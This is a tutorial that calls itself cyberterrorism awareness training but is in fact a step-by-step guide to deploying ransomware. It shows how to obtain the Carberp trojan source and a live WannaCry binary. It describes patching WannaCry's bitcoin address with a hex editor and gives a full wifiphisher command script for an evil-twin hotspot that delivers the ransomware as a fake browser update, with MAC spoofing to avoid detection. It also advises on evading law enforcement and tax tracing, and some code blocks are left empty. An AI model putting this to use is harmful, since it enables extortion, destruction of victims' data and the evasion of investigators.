*Chang Tan
*Lister Unlimited Cybersecurity Solutions, LLC.
*March 3rd, 2018, 8:11am
*Cyberterrorism and Hyperjacking Awareness Training Course

# Foreward: I am very excited to draft this portion

# Online sources, theZoo

The funny thing about malware is that once the weaponized variant is released, it's going to end up someone in the public domain. Especially here, https://github.com/ytisf/theZoo

So clone the repo

```
mkdir ~/Documents/Documents/github-the-zoo
cd ~/Documents/Documents/github-the-zoo
git clone https://github.com/ytisf/theZoo
cd theZoo
git pull origin master --force
```

Then make a backup

```
cd ..
zip -r the-zoo-repo.zip theZoo
```

Now lets have a quick exploration

```
cd theZoo/malwares
ls
```
We have two directories... Binaries, or executable file formats which you should NOT execute, and instead disperse them as a weaponized munition.
And we have Source, which is the source code and build kits prior to compilation. 

Personally I use the Carberp exploit pack located here...

```~/Documents/theZoo/malwares/Source/Original/Carberp/Carberp.zip```

To unlock, ```unzip Carberp.zip``` and enter the password ```infected```

```
root@Lister-Unlimited-Hypervisor:~/Documents/theZoo/malwares/Source/Original/Carberp/Carberp-master/source - absource/pro# ls *
anti_rapport	  BSS		  FakeDllAutorun  ms0073      sert
BC		  Demo_cur	  GrabberIE_FF	  NodInject   SkypeSMS
BinToHex	  Demo_Cur2	  hvnc_dll	  OCR	      talk
BJWJ		  Demo_Cur3	  igrdemodll	  OffInet     Worm
BlackJoeWhiteJoe  DllLoaderHook   InjectDLL	  portforw
bootkit		  DllLoaderHook1  keys		  rdp xpterm
BootkitDropper	  DropSploit	  Locker	  RemoteCtl
bootkit.old	  DropSploit1	  Mini		  schtasks
```

Beautiful. So what is Carberp? Half a decade ago a mysterious Russian crime syndicate released the source code of a powerful banking trojan prior to being arrested and prosecuted. Carberp was composed by approximately 20 Russian cybercriminals, hackers, and software developers with connections to the Russian mob.

The CIA and NSA have been documented to base some malware code on Carberp according to WikiLeaks. My company has cited Carberp as their number one source of malware code.

And now that power is in your hands.

# Another cool trick, modifying the bitcoin address of WannaCry with a hex editor to re-release it.

The beauty is that since you have no idea how to reverse engineer WannaCry, and neither do I, there is no way to stop the damage from being done! This is not the lousy version that has been sinkholed by Marcus Hutchins. This is the later variant that continues to operate and spread to this day.

But what I did learn is that the bitcoin addresses are in cleartext. Which means it can be edited without negatively affecting the malware performance along as it is performed with PRECISION. 

Now my choice of hex editor is Tweak. But first we need to verify the malware is legit

```
root@Lister-Unlimited-Hypervisor:~/Documents/theZoo/malwares/Binaries/Ransomware.WannaCry_Plus# sha256sum Win32.Wannacry.exe 
55504677f82981962d85495231695d3a92aa0b31ec35a957bd9cbbef618658e3  Win32.Wannacry.exe
```

Ensure that the hash value matches that.

Then we need a appropriate delivery vector, for wireless hacking which is my primary specialty, lets use wifi-phisher. In Wifi-Phisher there is a module called Browser_Plugin_Update. How it works is...

1. One pentest adapter is set to kick people off the legitimate network
2. A second peontest adapter projects a near-identical wireless access point
3. Upon connection, a variant of DNS Redirection is performed, with a captive portal produced to allow even cell phones to get forced in there.
4. There is no uplink in this network, we are merely redirecting victims into our page to force a browser download.
5. When a victim clicks on it, WannaCry.exe is renamed update.exe and they will allow it's installation
6. If you followed my optional step, then your bitcoin address is also put in there in place of the original bitcoin address.
7. Hopefully you'll get a couple hunned' in your bitcoin wallet ;)
8. The malware cannot be removed without a full hard disk wipe overwritten with zeroes. All of their data is gone.

```
git clone https://github.com/wifiphisher/wifiphisher
cd wifiphisher
python setup.py install
```

Now lets install our hex editor

```
sudo apt-get update && apt-get install -y tweak
```

Produce a copy of wannacry first so if we break it we got a backup.

```
```

Then run tweak on wannacry

```
```

We are looking for two strings that represent the original bitcoin addresses in the original WannaCry ransom note

```
```

Now I don't know your bitcoin address but word of advice, there is a banking history that is forensically traceable to our current bitcoin address which changes constantly. We will use the OLDER ones in your bitcoin wallet because that way it'll still route to your current bitcoin address.

```
```

Replace the original BTC addr with your replacement

```
```

Now another word of advice. When you get the money, AVOID withdrawing it. The withdrawal creates the paper trail that allows the FBI to track you. Bitcoin ledgers are the same thing as the banking transactions in your monthly statement. It also creates the paper trail that allows the IRS to demand you give them their share of taxable expenses.

I much prefer to spend bitcoin on payable with bitcoin services, like mercenary hackers. 

# Now to launch the payload dropper hotspot

Wifi-Phisher operates in two modes, CLI and interactive
```
# Interactive
wifi-phisher
```
To perform CLI fast-launch mode
```
wifiphisher -aI <iface #1> -jI <iface #2> -p plugin_update -e 'essid'
```

To create a idiot proofed script that will prevent your discovery
```
echo 'ifdown wlan1;ifdown wlan2;hostnamectl set-hostname 'UNLV-Guest';macchanger -r -b wlan1;macchanger -r -b wlan2;rfkill unblock all;ifup wlan1;ifup wlan2;fuser -k 443/tcp;fuser -k 8080/tcp;wifiphisher -aI wlan1 -jI wlan2 -p plugin_update -e 'UNLV-Guest'' > launch-hotspot-unlv-guest.sh
```

Breaking down the command

1. Shut down wireless interfaces 1 and 2
2. Change internal hostname so the nosey fuckers won't find out
3. Change the BURNED IN MAC ADDRESSES to a random address for both interfaces
4. Unblock any annoying Linux blockages that could have occurred
5. Free ports 443 and 8080, the HTTP ports that wifiphisher needs to run it's internal phishing page
6. Run wifiphisher with the scenario Browser Plugin Update and iface1 as the fake access point, iface2 as the de-authenticator, with the name 'UNLV-Guest'


Regardless, you need to specify the path to your payload in a interactive menu. 

```
ls $PWD/wannacry.exe
Copy and paste it into the prompt
```
But we can also code a auto-interact with wifiphisher program using python.

```
echo '#!/usr/bin/python' > auto-wc-dropper.py
atom auto-wc-dropper.py
```

Here is my variant of the source code

# Word of Warning on MAC addresses

You need to match MAC mac addresses that you change to via macchanger. Quickly decloak any hididen MAC addresses and run airodump on your wireless adapters set in monitor mode.

Do not make a exactly identical mac address. You need something very close otherwise you and it will jam each other causing clients to get ping-ponged back and forth and fail to deliver a payload but cause quite a ruckus.

Normally, a MAC address comes in pairs.

1. One for the 2.4 GHz band
2. Another for the 5GHz band

Locate a MAC address in the area and do a +1 or +next letter on the last digit.

# In the event that the repo is brought down, notify me immediately, changtan@listerunlimited.com

I will put it up on my company website https://www.listerunlimited.com

My mission is to ensure that you're not in handcuffs facing federal charges. I will apply everything I know in ensuring your survival. 
